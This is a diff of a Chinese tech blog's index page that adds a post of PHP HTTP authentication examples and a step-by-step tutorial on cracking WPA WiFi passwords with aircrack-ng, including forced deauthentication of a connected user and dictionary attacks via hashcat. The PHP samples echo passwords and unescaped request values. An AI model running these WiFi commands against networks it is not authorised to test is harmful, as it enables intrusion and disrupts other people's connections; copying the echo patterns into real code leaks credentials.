@@ -120,7 +120,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">357</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">136</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">359</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">138</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -185,18 +185,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">136</span>
+          <span class="site-state-item-count">138</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">357</span>
+        <span class="site-state-item-count">359</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -221,6 +221,204 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/14/%E7%94%A8-PHP-%E8%BF%9B%E8%A1%8C-HTTP-%E8%AE%A4%E8%AF%81%E7%9A%84%E5%87%A0%E7%A7%8D%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/10/14/%E7%94%A8-PHP-%E8%BF%9B%E8%A1%8C-HTTP-%E8%AE%A4%E8%AF%81%E7%9A%84%E5%87%A0%E7%A7%8D%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F-1/" class="post-title-link" itemprop="url">用 PHP 进行 HTTP 认证的几种认证方式</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-10-14 22:24:00" itemprop="dateCreated datePublished" datetime="2020-10-14T22:24:00+08:00">2020-10-14</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Example #1 Basic HTTP 认证范例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;My Realm&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Text to send if user hits Cancel button&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Hello <span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You entered <span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_PW&#x27;]&#125;</span> as your password.&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Example #2 Digest HTTP 认证范例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$realm</span> = <span class="string">&#x27;Restricted area&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//user =&gt; password</span></span><br><span class="line"><span class="variable">$users</span> = <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span> =&gt; <span class="string">&#x27;mypass&#x27;</span>, <span class="string">&#x27;guest&#x27;</span> =&gt; <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_DIGEST&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Digest realm=&quot;&#x27;</span>.<span class="variable">$realm</span>.</span><br><span class="line">           <span class="string">&#x27;&quot;,qop=&quot;auth&quot;,nonce=&quot;&#x27;</span>.<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;&quot;,opaque=&quot;&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$realm</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Text to send if user hits Cancel button&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// analyze the PHP_AUTH_DIGEST variable</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$data</span> = <span class="title function_ invoke__">http_digest_parse</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_DIGEST&#x27;</span>])) ||</span><br><span class="line">    !<span class="keyword">isset</span>(<span class="variable">$users</span>[<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Wrong Credentials!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate the valid response</span></span><br><span class="line"><span class="variable">$A1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;:&#x27;</span> . <span class="variable">$realm</span> . <span class="string">&#x27;:&#x27;</span> . <span class="variable">$users</span>[<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]]);</span><br><span class="line"><span class="variable">$A2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line"><span class="variable">$valid_response</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$A1</span>.<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;nonce&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;nc&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;cnonce&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;qop&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$A2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;response&#x27;</span>] != <span class="variable">$valid_response</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Wrong Credentials!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ok, valid username &amp; password</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are logged in as: &#x27;</span> . <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// function to parse the http auth header</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_digest_parse</span>(<span class="params"><span class="variable">$txt</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// protect against missing data</span></span><br><span class="line">    <span class="variable">$needed_parts</span> = <span class="keyword">array</span>(<span class="string">&#x27;nonce&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;nc&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;cnonce&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;qop&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;username&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;response&#x27;</span>=&gt;<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$keys</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$needed_parts</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;@(&#x27;</span> . <span class="variable">$keys</span> . <span class="string">&#x27;)=(?:([\&#x27;&quot;])([^\2]+?)\2|([^\s,]+))@&#x27;</span>, <span class="variable">$txt</span>, <span class="variable">$matches</span>, PREG_SET_ORDER);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$matches</span> <span class="keyword">as</span> <span class="variable">$m</span>) &#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$m</span>[<span class="number">1</span>]] = <span class="variable">$m</span>[<span class="number">3</span>] ? <span class="variable">$m</span>[<span class="number">3</span>] : <span class="variable">$m</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$needed_parts</span>[<span class="variable">$m</span>[<span class="number">1</span>]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$needed_parts</span> ? <span class="literal">false</span> : <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Example #3 强迫重新输入用户名和密码的 HTTP 认证的范例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Test Authentication System&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You must enter a valid login ID and password to access this resource\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>]) ||</span><br><span class="line">      (<span class="variable">$_POST</span>[<span class="string">&#x27;SeenBefore&#x27;</span>] == <span class="number">1</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;OldAuth&#x27;</span>] == <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &#123;</span><br><span class="line">   <span class="title function_ invoke__">authenticate</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome: <span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&lt;br /&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Old: <span class="subst">&#123;$_REQUEST[&#x27;OldAuth&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;<span class="subst">&#123;$_SERVER[&#x27;PHP_SELF&#x27;]&#125;</span>&#x27; METHOD=&#x27;post&#x27;&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;SeenBefore&#x27; value=&#x27;1&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;OldAuth&#x27; value=&#x27;<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Re Authenticate&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/04/aircrack-ng/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/06/04/aircrack-ng/" class="post-title-link" itemprop="url">Aircrack-ng 爆破 wifi 密码</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-06-04 00:00:00" itemprop="dateCreated datePublished" datetime="2020-06-04T00:00:00+08:00">2020-06-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Aircrack-ng是一个基于WiFi无线网络分析有关的安全软件，主要功能有网络侦测、数据包嗅探、WEP和WPA&#x2F;WPA2-PSK破解等。<br>因为安全性的原因。现在，周围很少有用WEP算法来加密的WiFi密码，不过基本命令都很相似。</p>
+<p>WiFi网络构成</p>
+<ol>
+<li>WiFi是一个建立于IEEE 802.11标准的无线局域网络（WLAN）设备。</li>
+<li>WiFi工作原理AP(Access Point 例如：无线路由器)每100ms将SSID（Service Set Identifier）经由beacons（信号台）封包广播一次。</li>
+</ol>
+<h4 id="查看网卡信息"><a href="#查看网卡信息" class="headerlink" title="查看网卡信息"></a>查看网卡信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-57.png" alt="upload successful"></p>
+<h4 id="启动监听模式"><a href="#启动监听模式" class="headerlink" title="启动监听模式"></a>启动监听模式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-58.png" alt="upload successful"></p>
+<h4 id="准备抓取握手包"><a href="#准备抓取握手包" class="headerlink" title="准备抓取握手包"></a>准备抓取握手包</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 6 -bssid 64:6E:97:DA:39:5C -w thomas wlan0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-c：信道号</li>
+<li>–bssid：apMAC</li>
+<li>-w：保存的文件名</li>
+</ul>
+<p><img src="/images/pasted-59.png" alt="upload successful"></p>
+<p>扫描到的WiFi热点信息</p>
+<ul>
+<li>BSSID：WiFi路由器的MAC地址</li>
+<li>PWR：网卡报告信号水平，信号值越高说明离AP越近。（PWR&#x3D;-1，网卡驱动不支持报告此项信息）</li>
+<li>Beacons：无线AP发出的通告编号</li>
+<li>#Data：被捕获到的数据分组的数量（一般数据量越大，抓取握手包更容易）</li>
+<li>#&#x2F;s：过去10秒钟内每秒捕获数据分组的数量</li>
+<li>CH：信道号（从Beacon中获取）</li>
+<li>MB：无线AP所支持的最大速率</li>
+<li>ENC：加密算法体系</li>
+<li>CIPHER：加密算法</li>
+<li>AUTH：使用的认证协议</li>
+<li>ESSID：wifi名称</li>
+</ul>
+<p>使已连接WiFi的用户A强制下线，之后A会向WiFi路由重新发送一个带密码的请求握手包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a 64:6E:97:DA:39:5C -c C2:46:34:ED:48:4C wlan0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-0：攻击数据包数量</li>
+<li>-a：WiFi MAC 地址</li>
+<li>-c：用户 MAC 地址</li>
+</ul>
+<p><img src="/images/pasted-60.png" alt="upload successful"></p>
+<p>出现 <code>WAP handshake</code> 表示已经获取到了握手包，下面就可以实现破解了</p>
+<p><img src="/images/pasted-61.png" alt="upload successful"></p>
+<h4 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w pass.txt thomas-01.cap</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-w：字典文件路径</li>
+</ul>
+<p><img src="/images/pasted-62.png" alt="upload successful"></p>
+<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>关于密码破解，可以使用kali自带的hashcat使效率大大增加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng [抓取到的握手包文件名] -J [转换后的文件名]</span><br><span class="line">hashcat -m 2500 .hccap password.txt</span><br></pre></td></tr></table></figure>
+<p>参数： -m 2500为破解的模式为WPA&#x2F;PSK方式  hccap格式的文件是刚刚转化好的文件  字典文件 </p>
+<p>注：最新版hashcat一般情况下不支持hccap格式，第一步需将握手包cap格式转换为hccapx</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -955,157 +1153,6 @@
 
 <p><code>app\admin\controller\PublicController</code> 类</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PublicController</span> <span class="keyword">extends</span> <span class="title">AdminBaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="comment">// 设置后台登录加密码</span></span><br><span class="line">        <span class="variable">$loginAllowed</span> = <span class="title function_ invoke__">session</span>(<span class="string">&quot;__LOGIN_BY_CMF_ADMIN_PW__&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$loginAllowed</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">cmf_get_root</span>() . <span class="string">&quot;/&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">session</span>(<span class="string">&quot;__SP_ADMIN_LOGIN_PAGE_SHOWED_SUCCESS__&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;:login&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       	<span class="comment">// 判断登录页面是否显示成功</span></span><br><span class="line">        <span class="variable">$loginAllowed</span> = <span class="title function_ invoke__">session</span>(<span class="string">&quot;__SP_ADMIN_LOGIN_PAGE_SHOWED_SUCCESS__&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$loginAllowed</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;非法登录!&#x27;</span>, <span class="title function_ invoke__">cmf_get_root</span>() . <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 登陆逻辑 ...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 登陆成功</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">session</span>(<span class="string">&#x27;ADMIN_ID&#x27;</span>, <span class="variable">$result</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">session</span>(<span class="string">&#x27;name&#x27;</span>, <span class="variable">$result</span>[<span class="string">&quot;user_login&quot;</span>]);</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">session</span>(<span class="string">&quot;__LOGIN_BY_CMF_ADMIN_PW__&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="title function_ invoke__">session</span>(<span class="string">&quot;__SP_ADMIN_LOGIN_PAGE_SHOWED_SUCCESS__&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="title function_ invoke__">lang</span>(<span class="string">&#x27;LOGIN_SUCCESS&#x27;</span>), <span class="title function_ invoke__">url</span>(<span class="string">&quot;admin/Index/index&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/17/%E8%B0%83%E6%95%B4Kali-linux%E6%97%B6%E5%8C%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2019/11/17/%E8%B0%83%E6%95%B4Kali-linux%E6%97%B6%E5%8C%BA/" class="post-title-link" itemprop="url">调整Kali linux时区</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2019-11-17 00:00:00" itemprop="dateCreated datePublished" datetime="2019-11-17T00:00:00+08:00">2019-11-17</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>目的：渗透测试和安全审计中需要kali linux的系统时间与实际时间同步。</p>
-<p>命令：<code>sudo timedatectl set-timezone &quot;Asia/Shanghai&quot;</code></p>
-<p>使用命令 <code>timedatectl</code> 查看当前时区等信息</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
